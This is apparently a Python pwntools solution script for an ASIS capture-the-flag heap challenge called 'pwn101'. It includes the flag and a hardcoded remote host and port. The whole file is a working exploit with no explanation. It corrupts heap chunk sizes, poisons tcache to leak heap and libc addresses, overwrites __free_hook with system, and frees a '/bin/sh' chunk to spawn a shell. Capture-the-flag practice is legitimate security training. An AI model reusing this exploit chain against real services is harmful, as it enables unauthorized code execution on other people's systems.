#!/usr/bin/env python
# encoding: utf-8
# ASIS{t0ken1Z3_mE_pleas3_1N_SilKr04D!!}
__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './pwn101.elf'
TARGET = ('82.196.10.106', 29099)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def add(length, name, desc):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Description Length:', str(length))
    r.sendlineafter('Phone Number:', str(1234))
    r.sendlineafter('Name: ', name)
    if len(desc) >= length:
        r.sendafter('Description: ', desc)
    else:
        r.sendlineafter('Description: ', desc)

def show(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Index:', str(idx))

def dele(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Index:', str(idx))

code = ELF(BINARY)
libc = ELF(LIBC64)
#attach(0xcc6)
    
add(0x28, '0'*8, '\xaa'*0x10)
add(0x28, '1'*8, '\xbb'*0x10)
add(0x28, '2'*8, '\xcc'*0x10)
dele(0)
add(0x28, '0'*8, 'a'*0x28+'\x61')
dele(0)
dele(1)
add(0x58, 'x'*8, 'x'*0x2f)
show(0)
r.recvuntil('x'*8 + '\n')
r.recvuntil('x'*8 + '\n')
heap = u64(r.recv(6) + '\x00\x00') - 0x1af0 + 0x880
log.info('%#x'%heap)
add(0x28, '0'*8, '\xdd'*0x10)

dele(0)
add(0x58, 'x'*8, 'x'*0x28+p64(0x31)+p64(heap+0x1270))
dele(0)
dele(1)
dele(2)

for i in xrange(8):
    add(0xf8, '2'*8, 'c'*0x10)

add(0x28, 'x'*8, '\xdd'*0x10)

for i in xrange(8):
    dele(i)

for i in xrange(3):
    add(0x28, '\x55'*8, '\xaa'*0x10)

dele(2)
dele(1)
dele(0)
dele(8)

add(0x58, 'x'*8, 'x'*0x28+p64(0x31) + p64(heap+0x19c0))
add(0x28, p64(heap+0x1b20), 'x'*8)
add(0x28, '3', 'x'*7)
show(2)
r.recvuntil('x'*7 + '\n')
libc.address = u64(r.recv(6) + '\x00\x00') - 0x3ebca0
log.info('%#x'%libc.address)


add(0x28, 'x'*8, '\xdd'*0x10)

dele(1)
dele(0)
add(0x58, 'x'*8, 'x'*0x28+p64(0x31) + p64(libc.sym['__free_hook']))
add(0x28, '/bin/sh\x00', p64(libc.sym['system']))
dele(1)
r.interactive()
